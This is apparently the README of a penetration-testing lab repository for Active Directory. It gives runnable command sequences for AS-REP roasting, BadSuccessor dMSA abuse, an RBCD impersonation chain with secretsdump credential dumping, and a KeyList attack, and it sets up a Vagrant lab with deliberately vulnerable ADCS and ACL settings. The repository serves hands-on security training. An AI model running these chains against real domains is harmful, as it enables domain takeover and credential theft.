# ad-lab

Active Directory attack techniques, automation scripts, BloodHound custom queries,
and a reproducible lab environment for hands-on practice.

Companion to [ad-attack-chain](https://github.com/Jostif/ad-attack-chain) which
automates the live engagement chain. This repo covers additional techniques, lab
setup, and reference material.

> **Legal notice:** For use only in lab environments you own. Never run against
> systems without explicit written authorization.

---

## Contents

```
ad-lab/
├── attacks/
│   ├── asreproast.py       # AS-REP Roasting (GetNPUsers + hashcat 18200)
│   ├── badsuccessor.py     # BadSuccessor / dMSA abuse PoC (2025)
│   └── rbcd.py             # RBCD attack chain + KeyList (RODC)
├── bloodhound/
│   ├── queries.md          # Custom Cypher queries with explanations
│   └── custom-queries.json # Import directly into BloodHound UI
└── lab-setup/
    ├── Vagrantfile         # 2-machine AD lab (DC01 + WS01)
    └── provision/
        ├── 01_promote_dc.ps1       # AD DS install + DC promotion
        ├── 02_configure_ad.ps1     # Users, groups, OUs, ACL misconfigs
        ├── 03_setup_adcs.ps1       # ADCS + ESC1/ESC8 vulnerable templates
        ├── 04_vulnerable_configs.ps1 # RBCD, BadSuccessor, SMB relay surface
        └── 06_kali_tools.sh        # Attacker VM tool installation
```

---

## Attack techniques

### AS-REP Roasting
Targets accounts with `DONT_REQUIRE_PREAUTH` set (UAC flag `0x400000`).
No credentials required — request AS-REP hash for any vulnerable account.

```bash
python3 attacks/asreproast.py -c config.yaml --dry-run
python3 attacks/asreproast.py -c config.yaml
```

Manual equivalent:
```bash
GetNPUsers.py lab.local/ -dc-ip 192.168.56.10 -usersfile users.txt -format hashcat -no-pass
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

### BadSuccessor (dMSA abuse)
Disclosed by Akamai, May 2025. Affects Windows Server 2025 domains.
Any user with `CreateChild` rights on an OU can create a dMSA that inherits
permissions from any account — including Domain Admins.

```bash
python3 attacks/badsuccessor.py -c config.yaml --target Administrator --dry-run
python3 attacks/badsuccessor.py -c config.yaml --target Administrator
```

Manual steps:
```bash
# 1. Find vulnerable OUs
bloodyAD --host 192.168.56.10 -d lab.local -u jdoe -p Password1 get writable --otype OU --right CREATE_CHILD

# 2. Create dMSA superseding Administrator
bloodyAD --host 192.168.56.10 -d lab.local -u jdoe -p Password1 add dMSA svc-evil --ou "OU=ServiceAccounts,DC=lab,DC=local" --supersede "CN=Administrator,CN=Users,DC=lab,DC=local"

# 3. Retrieve managed password → NT hash
bloodyAD --host 192.168.56.10 -d lab.local -u jdoe -p Password1 get object "svc-evil$" --attr msDS-ManagedPassword
```

---

### RBCD (Resource-Based Constrained Delegation)

```bash
# Full RBCD chain against WS01
python3 attacks/rbcd.py rbcd -c config.yaml --target WS01$ --impersonate Administrator --dry-run
python3 attacks/rbcd.py rbcd -c config.yaml --target WS01$ --impersonate Administrator
```

Manual steps:
```bash
# 1. Create fake computer
bloodyAD --host 192.168.56.10 -d lab.local -u jdoe -p Password1 add computer FAKEMACHINE$ FakePass123!

# 2. Set RBCD
bloodyAD --host 192.168.56.10 -d lab.local -u jdoe -p Password1 set rbcd WS01$ FAKEMACHINE$

# 3. S4U2Proxy
getST.py lab.local/FAKEMACHINE$:FakePass123! -spn cifs/WS01$ -impersonate Administrator -dc-ip 192.168.56.10

# 4. Use ticket
export KRB5CCNAME=Administrator@cifs_WS01$@LAB.LOCAL.ccache
secretsdump.py -k -no-pass lab.local/Administrator@WS01$
```

---

### KeyList attack (RODC)

```bash
# Requires RODC krbtgt AES256 key and RID
python3 attacks/rbcd.py keylist \
    -c config.yaml \
    --key <rodc_krbtgt_aes256_key> \
    --rid 8245 \
    --user Administrator
```

---

## BloodHound custom queries

**Import into BloodHound:**
1. Open BloodHound UI → Explore → Cypher tab
2. Click **Manage Queries** → **Import**
3. Select `bloodhound/custom-queries.json`

Queries included:

| Category | Query |
|---|---|
| Kerberoasting | Kerberoastable users (enabled, not krbtgt) |
| Kerberoasting | Kerberoastable users with DA path |
| AS-REP | Accounts with pre-auth disabled |
| Shadow Creds | GenericWrite targets |
| RBCD | GenericWrite on computers |
| ACL | All write edges to high-value targets |
| DCSync | Users with replication rights |
| RODC | Allowed RODC PRP members |
| RODC | High-value users NOT in Denied RODC PRP (KeyList targets) |
| Paths | Shortest path from owned to DA |
| Misc | AdminSDHolder members, DA sessions, SID history |

---

## Lab setup

### Prerequisites

**1. Vagrant** — https://developer.hashicorp.com/vagrant/downloads
```bash
# Verify
vagrant --version   # >= 2.3.0
```

**2. Hypervisor — choose one:**

| Hypervisor | Download | Notes |
|---|---|---|
| VirtualBox | https://virtualbox.org/wiki/Downloads | Free, easiest setup |
| VMware Workstation Pro | https://broadcom.com/products/desktop-hypervisors | Free since 2024 |
| VMware Fusion (macOS) | https://blogs.vmware.com/teamfusion/2024/05/fusion-pro-now-available-free-for-personal-use.html | Free for personal use |
| libvirt / KVM (Linux) | `sudo apt install vagrant-libvirt` | Best for Linux hosts |

**3. Vagrant provider plugin** — install the one matching your hypervisor:
```bash
# VirtualBox (default — no plugin needed)
vagrant plugin install vagrant-reload

# VMware
vagrant plugin install vagrant-vmware-desktop
vagrant plugin install vagrant-reload

# libvirt / KVM
vagrant plugin install vagrant-libvirt
vagrant plugin install vagrant-reload
```

**4. Resources required:**

| Resource | Minimum | Recommended |
|---|---|---|
| RAM | 8GB free | 16GB free |
| Disk | 60GB free | 90GB free |
| CPU | 4 cores | 6+ cores |

> Windows Server boxes (~9GB each) are downloaded automatically on first `vagrant up` — no manual ISO or license needed. Microsoft provides free 180-day evaluation builds.

---

### Provider configuration

The Vagrantfile defaults to **VirtualBox**. To use a different hypervisor, either pass the provider flag or set a default:

```bash
# VMware
vagrant up --provider=vmware_desktop

# libvirt / KVM
vagrant up --provider=libvirt

# Set a permanent default (optional)
export VAGRANT_DEFAULT_PROVIDER=vmware_desktop
```

---

### Spin up the lab
```bash
cd lab-setup

# Start full lab (DC01 + WS01) — ~20 min first run
vagrant up

# DC only (faster for testing)
vagrant up DC01

# Add Kali attacker VM (optional — skip if using existing Kali)
vagrant up KALI
```

### Lab credentials
| Account | Password | Notes |
|---|---|---|
| Administrator | Lab@12345 | Domain Admin |
| svc_backup | Password1 | Kerberoastable, GenericWrite target |
| svc_nopreauth | Summer2024! | AS-REP roastable |
| jdoe | Lab@12345! | GenericWrite on svc_backup, WS01$ |
| jsmith | Welcome1 | WriteDacl on svc_web |

### Attack surface summary
| Technique | Vector |
|---|---|
| Kerberoasting | svc_backup (MSSQLSvc), svc_web (HTTP) |
| AS-REP Roasting | svc_nopreauth |
| Shadow Credentials | jdoe → svc_backup (GenericWrite) |
| ADCS ESC1 | VulnESC1 template (Domain Users can enroll + supply SAN) |
| ADCS ESC8 | http://DC01/certsrv (HTTP, no EPA) |
| RBCD | jdoe → WS01$ (GenericWrite) |
| BadSuccessor | jdoe → ServiceAccounts OU (CreateChild dMSA) |
| SMB relay | Signing disabled on DC01 |

### Snapshots
```bash
# Save clean state after provisioning
vagrant snapshot save DC01 baseline
vagrant snapshot save WS01 baseline

# Restore after testing
vagrant snapshot restore DC01 baseline
vagrant snapshot restore WS01 baseline
```

---

## Tested on
- HTB Garfield (RODC / KeyList attack chain)
- HTB Logging (Shadow Credentials + ADCS)
- HTB Eighteen (BadSuccessor)
- Local GOAD lab

---

## Related repos
- [ad-attack-chain](https://github.com/Jostif/ad-attack-chain) — live engagement automation
- [nuclei-templates](https://github.com/Jostif/nuclei-templates) — web vulnerability templates

---

## Author

**J0stif** — penetration tester, bug bounty hunter
PNPT · PWPA · CEH · OSCP (in progress) · HTB CPTS (in progress) · HTB CWES (in progress)

[HTB Profile](https://app.hackthebox.com/users/2209690) · [Writeups & Notes](https://j0stif.github.io) · [X social](https://x.com/J0stif)
